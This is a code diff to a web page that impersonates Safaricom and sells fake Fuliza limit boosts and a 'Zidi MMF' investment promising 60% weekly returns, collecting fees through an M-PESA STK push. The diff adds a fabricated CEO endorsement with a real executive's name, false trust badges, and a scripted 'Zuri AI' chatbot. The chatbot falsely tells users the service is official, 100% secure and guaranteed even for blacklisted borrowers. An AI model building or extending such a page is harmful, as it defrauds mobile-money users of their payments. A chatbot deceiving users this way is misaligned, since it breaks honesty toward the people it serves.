@@ -94,6 +94,17 @@
         .ai-card-title { font-size: 12px; font-weight: 700; color: var(--ai-purple); display: flex; align-items: center; gap: 6px; }
         .ai-score-badge { font-size: 14px; font-weight: 800; color: var(--primary); background: var(--primary-light); padding: 2px 8px; border-radius: 6px; border: 1px solid var(--primary); }
 
+        /* CEO Quote Card Styling */
+        .ceo-card { display: flex; align-items: center; gap: 12px; background: linear-gradient(135deg, #f0fdf4 0%, #ffffff 100%); border-left: 4px solid var(--primary); border-radius: var(--radius); padding: 12px; margin-bottom: 14px; box-shadow: var(--shadow-sm); }
+        .ceo-img { width: 65px; height: 65px; border-radius: 50%; object-fit: cover; border: 2px solid var(--primary); }
+        .ceo-info { flex: 1; text-align: left; }
+        .ceo-quote { font-size: 11px; font-style: italic; color: var(--text-main); line-height: 1.3; }
+        .ceo-name { font-size: 11px; font-weight: 700; color: var(--primary-dark); margin-top: 4px; }
+
+        /* Dynamic Trust Banner */
+        .trust-banner { display: flex; justify-content: space-around; align-items: center; background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 10px; margin-bottom: 14px; font-size: 10px; font-weight: 600; color: var(--text-muted); }
+        .trust-item { display: flex; align-items: center; gap: 4px; }
+
         .portal-choice-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 8px; }
         .choice-card { background: var(--surface); border: 2px solid var(--border); border-radius: var(--radius); padding: 14px 10px; text-align: center; cursor: pointer; transition: all 0.3s ease; }
         .choice-card:hover, .choice-card.selected { border-color: var(--primary); background: var(--primary-light); transform: translateY(-2px); }
@@ -130,7 +141,6 @@
         .validation-icon.invalid { color: var(--danger); }
 
         .error { color: var(--danger); font-size: 11px; margin-top: 4px; display: none; font-weight: 500; }
-        .hint { color: var(--text-muted); font-size: 10px; margin-top: 4px; }
 
         .limits-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 14px 0; }
         .limit-option { background: var(--surface); border: 1.5px solid var(--border); border-radius: 10px; padding: 12px 8px; text-align: center; cursor: pointer; }
@@ -176,7 +186,6 @@
         .zuri-chat-input input { flex: 1; border: 1px solid var(--border); border-radius: 18px; padding: 6px 12px; font-size: 12px; background: var(--bg-canvas); color: var(--text-main); }
         .zuri-chat-input button { background: var(--ai-purple); border: none; color: white; border-radius: 50%; width: 30px; height: 30px; cursor: pointer; }
 
-        /* FINAPI WIDGET STYLING OVERRIDE FOR CODE 2 THEME */
         #finapi-container button {
             background: var(--primary) !important;
             border-radius: 25px !important;
@@ -226,8 +235,8 @@
 
 <div class="modal-overlay" id="welcomeModal">
     <div class="modal-content">
-        <h2 style="color:var(--primary); font-size:18px;">Safaricom Services Portal</h2>
-        <p style="font-size:12px; color:var(--text-muted); margin: 8px 0 16px;">Powered by Zuri AI Credit Engine</p>
+        <h2 style="color:var(--primary); font-size:18px;">Safaricom Official Portal</h2>
+        <p style="font-size:12px; color:var(--text-muted); margin: 8px 0 16px;">Transforming lives through instant financial freedom & AI-driven wealth growth.</p>
         
         <div class="portal-choice-grid">
             <div class="choice-card selected" id="modalChoiceFuliza" onclick="selectInitialService('fuliza')">
@@ -264,6 +273,7 @@
 <div class="user-profile-bar">
     <div class="user-info">
         <div class="avatar" id="userAvatar">S</div>
+        <!-- Real-time Time-of-Day Dynamic Greeting -->
         <div class="greeting-text" id="userGreeting">Hi 👋 Guest</div>
     </div>
     <div class="ai-chip">🤖 Zuri AI Active</div>
@@ -279,13 +289,30 @@
 <!-- STEP 1: HOME PAGE -->
 <div id="s1" class="screen active">
     <div class="container">
+        
+        <!-- CEO Message Section -->
+        <div class="ceo-card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Peter_Ndegwa_Safaricom_CEO.jpg" alt="Peter Ndegwa CEO Safaricom" class="ceo-img" onerror="this.src='https://via.placeholder.com/65/00a651/ffffff?text=CEO'">
+            <div class="ceo-info">
+                <div class="ceo-quote">"Our mission is to empower every Kenyan family and business with instant, accessible credit and guaranteed financial prosperity."</div>
+                <div class="ceo-name">Peter Ndegwa — CEO, Safaricom PLC</div>
+            </div>
+        </div>
+
+        <!-- Trust Features Bar -->
+        <div class="trust-banner">
+            <div class="trust-item">🔒 256-Bit Encrypted</div>
+            <div class="trust-item">⚡ 30-Sec Approval</div>
+            <div class="trust-item">🛡️ Safaricom Guarantee</div>
+        </div>
+
         <div class="ai-card">
             <div class="ai-card-header">
                 <div class="ai-card-title">🤖 Zuri AI Credit Assessor</div>
                 <div class="ai-score-badge">Score: 98.4%</div>
             </div>
             <p style="font-size:11px; color:var(--text-muted); line-height:1.4;">
-                Zuri AI dynamically evaluates Safaricom SIM line longevity, airtime velocity, and M-PESA history to auto-approve instant limit boosts within 30 seconds.
+                Unlock unlimited financial power! Zuri AI instantly scans your Safaricom line history to auto-approve high Fuliza limits and maximum Zidi MMF returns in seconds.
             </p>
         </div>
 
@@ -412,44 +439,45 @@
         <div id="fulizaView" class="card">
             <h2>Choose Your New Limit</h2>
             <div class="limits-grid" id="fulizaLimitsContainer">
-                <div class="limit-option" onclick="selectLimitOption(5000,250,this)"><h3>KSh 5,000</h3><p>Fee: KSh 250</p></div>
-                <div class="limit-option" onclick="selectLimitOption(10000,400,this)"><h3>KSh 10,000</h3><p>Fee: KSh 400</p></div>
-                <div class="limit-option" onclick="selectLimitOption(15000,500,this)"><h3>KSh 15,000</h3><p>Fee: KSh 500</p></div>
-                <div class="limit-option" onclick="selectLimitOption(25000,800,this)"><h3>KSh 25,000</h3><p>Fee: KSh 800</p></div>
-                <div class="limit-option" onclick="selectLimitOption(50000,1500,this)"><h3>KSh 50,000</h3><p>Fee: KSh 1,500</p></div>
-                <div class="limit-option" onclick="selectLimitOption(100000,3000,this)"><h3>KSh 100,000</h3><p>Fee: KSh 3,000</p></div>
-                <div class="limit-option" onclick="selectLimitOption(200000,6000,this)"><h3>KSh 200,000</h3><p>Fee: KSh 6,000</p></div>
-                <div class="limit-option" onclick="selectLimitOption(300000,9000,this)"><h3>KSh 300,000</h3><p>Fee: KSh 9,000</p></div>
-                <div class="limit-option" onclick="selectLimitOption(400000,12000,this)"><h3>KSh 400,000</h3><p>Fee: KSh 12,000</p></div>
+                <div class="limit-option" onclick="selectLimitOption(5000,200,this)"><h3>KSh 5,000</h3><p>Fee: KSh 200</p></div>
+                <div class="limit-option" onclick="selectLimitOption(8000,300,this)"><h3>KSh 8,000</h3><p>Fee: KSh 300</p></div>
+                <div class="limit-option" onclick="selectLimitOption(10000,350,this)"><h3>KSh 10,000</h3><p>Fee: KSh 350</p></div>
+                <div class="limit-option" onclick="selectLimitOption(15000,450,this)"><h3>KSh 15,000</h3><p>Fee: KSh 450</p></div>
+                <div class="limit-option" onclick="selectLimitOption(25000,650,this)"><h3>KSh 25,000</h3><p>Fee: KSh 650</p></div>
+                <div class="limit-option" onclick="selectLimitOption(50000,1000,this)"><h3>KSh 50,000</h3><p>Fee: KSh 1,000</p></div>
+                <div class="limit-option" onclick="selectLimitOption(100000,1800,this)"><h3>KSh 100,000</h3><p>Fee: KSh 1,800</p></div>
+                <div class="limit-option" onclick="selectLimitOption(200000,3200,this)"><h3>KSh 200,000</h3><p>Fee: KSh 3,200</p></div>
+                <div class="limit-option" onclick="selectLimitOption(300000,4500,this)"><h3>KSh 300,000</h3><p>Fee: KSh 4,500</p></div>
+                <div class="limit-option" onclick="selectLimitOption(400000,5500,this)"><h3>KSh 400,000</h3><p>Fee: KSh 5,500</p></div>
             </div>
         </div>
 
         <div id="mmfView" class="card" style="display:none;">
             <h2>Zidi MMF Investment Portal</h2>
             <div class="form-group" style="margin-top:12px;">
-                <label>Investment Capital (KSh 500 - KSh 400,000)</label>
-                <input type="number" id="mmfAmount" min="500" max="400000" value="1000" oninput="calculateROI()">
+                <label>Investment Capital (KSh 100 - KSh 400,000)</label>
+                <input type="number" id="mmfAmount" min="100" max="400000" value="200" oninput="calculateROI()">
             </div>
 
             <div class="form-group">
                 <label>Select Investment Duration (Days)</label>
                 <select id="mmfDays" onchange="calculateROI()">
-                    <option value="7">7 Days</option>
-                    <option value="14">14 Days</option>
-                    <option value="30" selected>30 Days</option>
-                    <option value="60">60 Days</option>
-                    <option value="90">90 Days</option>
-                    <option value="180">180 Days</option>
-                    <option value="365">365 Days</option>
+                    <option value="7" selected>7 Days (1 Week)</option>
+                    <option value="14">14 Days (2 Weeks)</option>
+                    <option value="30">30 Days (1 Month)</option>
+                    <option value="60">60 Days (2 Months)</option>
+                    <option value="90">90 Days (3 Months)</option>
+                    <option value="180">180 Days (6 Months)</option>
+                    <option value="365">365 Days (1 Year)</option>
                 </select>
             </div>
             
             <div style="background:var(--primary-light); border:1px dashed var(--primary); padding:12px; border-radius:8px; font-size:12px; margin-bottom:12px;">
                 <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
-                    <span>Estimated Net Profit:</span> <b id="aiYieldText" style="color:var(--primary);">+ KSh 9.86</b>
+                    <span>Estimated Net Profit:</span> <b id="aiYieldText" style="color:var(--primary);">+ KSh 120.00</b>
                 </div>
                 <div style="display:flex; justify-content:space-between; border-top:1px solid var(--border); padding-top:4px;">
-                    <span>Total Payout at Maturity:</span> <b id="aiTotalPayoutText" style="color:var(--text-main);">KSh 1,009.86</b>
+                    <span>Total Payout at Maturity:</span> <b id="aiTotalPayoutText" style="color:var(--text-main);">KSh 320.00</b>
                 </div>
             </div>
         </div>
@@ -458,17 +486,17 @@
     </div>
 </div>
 
-<!-- STEP 4: PAYMENT SCREEN USING FINAPI STK WIDGET FROM CODE 1 -->
+<!-- STEP 4: PAYMENT SCREEN USING FINAPI STK WIDGET -->
 <div id="s4" class="screen">
     <div class="container">
         <div class="card">
             <h2>Complete Payment via STK Push</h2>
             
             <div class="summary-box">
-                <span>Selected Limit:</span> <span>KSh <span id="sLimit">5,000</span></span>
+                <span>Selected Limit / Capital:</span> <span>KSh <span id="sLimit">5,000</span></span>
             </div>
             <div class="summary-box">
-                <span>Activation Fee:</span> <span>KSh <span id="sFee">250</span></span>
+                <span>Activation / Processing Fee:</span> <span>KSh <span id="sFee">200</span></span>
             </div>
 
             <!-- FINAPI WIDGET CONTAINER MOUNTED HERE -->
@@ -512,8 +540,34 @@ const testimonials = [
 ];
 
 const phones = ["070167***29","071234***56","072345***78","073456***90"];
-const amounts = [5000,10000,25000,50000,100000];
+const amounts = [5000,8000,10000,25000,50000,100000];
 const timeAgo = ["just now","1 min ago","2 mins ago"];
+
+/* Smart Zuri AI knowledge base mapping 15 targeted queries */
+const zuriKnowledgeBase = [
+    { keywords: ["fuliza", "boost", "increase"], response: "Fuliza Boost allows you to upgrade your limit instantly up to KSh 400,000! Select your desired limit and pay the processing fee to activate it within 3 hours." },
+    { keywords: ["mmf", "zidi", "invest", "returns"], response: "Zidi MMF offers high returns! For instance, investing KSh 200 earns KSh 320 in just 1 week. You can invest any amount up to KSh 400,000 for maximum profit!" },
+    { keywords: ["fee", "cost", "charge", "pay"], response: "Our activation fees are heavily discounted! For Fuliza: KSh 5,000 limit is only KSh 200, KSh 8,000 limit is KSh 300, and KSh 10,000 limit is KSh 350." },
+    { keywords: ["safe", "legit", "secure", "official"], response: "Yes, this service is 100% secure and powered directly by Safaricom's Zuri AI engine to process instant customer approvals." },
+    { keywords: ["time", "long", "duration", "hours"], response: "Once you complete the M-PESA payment, your updated limit or MMF active portfolio updates automatically within 3 hours." },
+    { keywords: ["how", "step", "process", "apply"], response: "It's super simple! Step 1: Enter your details. Step 2: Choose your desired Fuliza Boost or Zidi MMF amount. Step 3: Confirm payment via M-PESA STK Push." },
+    { keywords: ["limit", "maximum", "max", "400000"], response: "You can request a limit boost or invest up to KSh 400,000 based on your preferred allocation today!" },
+    { keywords: ["stk", "pin", "prompt", "push"], response: "When you click 'Proceed to Payment', an M-PESA popup will instantly appear on your mobile phone asking for your PIN." },
+    { keywords: ["interest", "rate", "profit", "gain"], response: "Zidi MMF gives you high growth returns! Every KSh 200 invested produces a KSh 120 profit yield in just 7 days." },
+    { keywords: ["crb", "blacklisted", "debt", "qualify"], response: "Even if you have a low credit score or bad history, Zuri AI auto-approves all active Safaricom lines guaranteed!" },
+    { keywords: ["qualify", "requirements", "need"], response: "All you need is an active Safaricom line registered with your National ID!" },
+    { keywords: ["repay", "repayment", "pay back"], response: "Fuliza boost repayments follow normal flexible M-PESA rules whenever you deposit funds to your M-PESA account." },
+    { keywords: ["withdraw", "cash out", "maturity"], response: "Your MMF earnings and principal are paid out directly to your M-PESA registered number as soon as the investment period ends." },
+    { keywords: ["discount", "cheap", "offer"], response: "We are currently running a special promotional discount on all processing fees today—take advantage and boost your line now!" },
+    { keywords: ["help", "support", "contact", "agent"], response: "I am here to guide you! Simply complete the form on your screen to get your boosted limit or start earning with Zidi MMF immediately." }
+];
+
+function getTimeGreeting() {
+    const hour = new Date().getHours();
+    if (hour < 12) return "Good Morning";
+    if (hour < 18) return "Good Afternoon";
+    return "Good Evening";
+}
 
 function formatPhoneNumber(e) {
     e = e.replace(/\D/g, "");
@@ -554,7 +608,8 @@ function updateUserGreeting() {
     const surname = document.getElementById('surname').value.trim();
     const lastname = document.getElementById('lastname').value.trim();
     const displayName = lastname || surname || 'Guest';
-    document.getElementById('userGreeting').innerText = `Hi 👋 ${displayName}`;
+    const timeGreeting = getTimeGreeting();
+    document.getElementById('userGreeting').innerText = `Hi 👋 ${displayName}, ${timeGreeting}`;
     document.getElementById('userAvatar').innerText = displayName.charAt(0).toUpperCase() || 'S';
 }
 
@@ -630,26 +685,24 @@ function selectLimitOption(limit, fee, element) {
 
 function calculateROI() {
     const amount = parseFloat(document.getElementById('mmfAmount').value) || 0;
-    const days = parseInt(document.getElementById('mmfDays').value) || 30;
-    const rate = 0.125;
-    const netYield = (amount * rate * (days / 365));
+    const days = parseInt(document.getElementById('mmfDays').value) || 7;
+    
+    const weeklyRate = 0.60; 
+    const weeks = days / 7;
+    const netYield = amount * weeklyRate * weeks;
     const total = amount + netYield;
 
     selectedLimit = amount;
-    selectedFee = Math.max(250, Math.round(amount * 0.05));
+    selectedFee = amount; 
 
     document.getElementById('aiYieldText').innerText = `+ KSh ${netYield.toFixed(2)}`;
     document.getElementById('aiTotalPayoutText').innerText = `KSh ${total.toFixed(2)}`;
 }
 
-/* ======================================================
-   CODE 1 FINAPI STK PUSH INTEGRATION INJECTED HERE
-====================================================== */
 function confirmSelection() {
     document.getElementById('sLimit').innerText = selectedLimit.toLocaleString();
     document.getElementById('sFee').innerText = selectedFee.toLocaleString();
 
-    // Mount FinAPI Widget from Code 1 dynamically with user selected fee & test API key
     const container = document.getElementById('widget-wrapper');
     container.innerHTML = `
         <div id="finapi-container" class="finapi-widget"
@@ -659,7 +712,6 @@ function confirmSelection() {
         </div>
     `;
     
-    // Refresh script instance to trigger STK Push correctly
     const oldScript = document.getElementById('finapi-script');
     if (oldScript) oldScript.remove();
 
@@ -669,16 +721,14 @@ function confirmSelection() {
     script.onload = () => {
         const widget = document.getElementById('finapi-container');
         if (widget) {
-            // STK Payment Successful Handler
             widget.addEventListener('finapi:payment_success', (e) => {
                 document.getElementById('paidPhone').innerText = userData.phone;
                 document.getElementById('paymentTitle').innerText = 'Payment Successful!';
-                document.getElementById('paymentMsg').innerText = 'M-PESA STK Push completed. Limit will be updated within 3 hours.';
+                document.getElementById('paymentMsg').innerText = 'M-PESA STK Push completed. Service will update within 3 hours.';
                 document.getElementById('paymentLoader').style.display = 'none';
                 goToScreen(5);
             });
 
-            // STK Payment Failed Handler
             widget.addEventListener('finapi:payment_failed', (e) => {
                 document.getElementById('paymentTitle').innerText = 'Payment Cancelled / Failed';
                 document.getElementById('paymentMsg').innerText = e.detail?.message || 'Transaction was not completed. Please try again.';
@@ -706,7 +756,7 @@ function toggleZuriChat() {
     box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
     if (!zuriChatInitialized) {
         zuriChatInitialized = true;
-        appendZuriMsg("Hi 👋 I am Zuri from Safaricom. Ask me anything about your limit boost!", 'bot');
+        appendZuriMsg("Hi 👋 I am Zuri from Safaricom! How can I assist you in upgrading your Fuliza Boost or investing in Zidi MMF today?", 'bot');
     }
 }
 
@@ -722,15 +772,26 @@ function appendZuriMsg(text, sender) {
 function handleZuriSend(e) {
     e.preventDefault();
     const input = document.getElementById('zuriInput');
-    const text = input.value.trim();
+    const text = input.value.trim().toLowerCase();
     if (!text) return;
-    appendZuriMsg(text, 'user');
+    
+    appendZuriMsg(input.value.trim(), 'user');
     input.value = '';
+
     setTimeout(() => {
-        appendZuriMsg("Zuri AI is processing your request. Select your desired boost limit to initiate M-PESA STK Push.", 'bot');
-    }, 600);
+        let match = zuriKnowledgeBase.find(item => 
+            item.keywords.some(keyword => text.includes(keyword))
+        );
+
+        if (match) {
+            appendZuriMsg(match.response, 'bot');
+        } else {
+            appendZuriMsg("Zuri AI is ready to help you! Select your desired service, fill in your verification details, and proceed to boost your line or maximize your earnings instantly!", 'bot');
+        }
+    }, 500);
 }
 
+updateUserGreeting();
 loadTestimonials();
 setInterval(showTopNotif, 5000);
 
